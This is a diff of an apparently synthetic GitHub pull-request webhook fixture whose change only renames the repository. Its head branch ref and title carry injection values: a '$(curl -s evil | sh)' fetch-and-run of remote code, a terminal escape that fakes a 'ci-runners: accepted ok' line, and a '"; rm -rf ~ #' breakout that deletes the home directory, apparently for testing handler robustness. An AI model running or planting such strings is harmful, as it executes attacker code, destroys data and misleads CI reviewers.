@@ -1,13 +1,13 @@
 {
  "action": "synchronize",
  "number": 7,
- "repository": {"id": 1001, "full_name": "chaobrain/brainspike", "name": "brainspike", "private": true, "fork": false},
+ "repository": {"id": 1001, "full_name": "chaobrain/brainkit", "name": "brainkit", "private": true, "fork": false},
  "sender": {"login": "alice", "type": "User"},
  "pull_request": {
   "number": 7,
   "user": {"login": "alice", "type": "User"},
-  "head": {"ref": "$(curl -s evil | sh)`id`\n\u001b[2Jci-runners: accepted ok", "sha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo": {"id": 1001, "full_name": "chaobrain/brainspike", "name": "brainspike", "private": true, "fork": false}},
-  "base": {"ref": "main", "sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", "repo": {"id": 1001, "full_name": "chaobrain/brainspike", "name": "brainspike", "private": true, "fork": false}},
+  "head": {"ref": "$(curl -s evil | sh)`id`\n\u001b[2Jci-runners: accepted ok", "sha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo": {"id": 1001, "full_name": "chaobrain/brainkit", "name": "brainkit", "private": true, "fork": false}},
+  "base": {"ref": "main", "sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", "repo": {"id": 1001, "full_name": "chaobrain/brainkit", "name": "brainkit", "private": true, "fork": false}},
   "title": "\"; rm -rf ~ #"
  }
 }
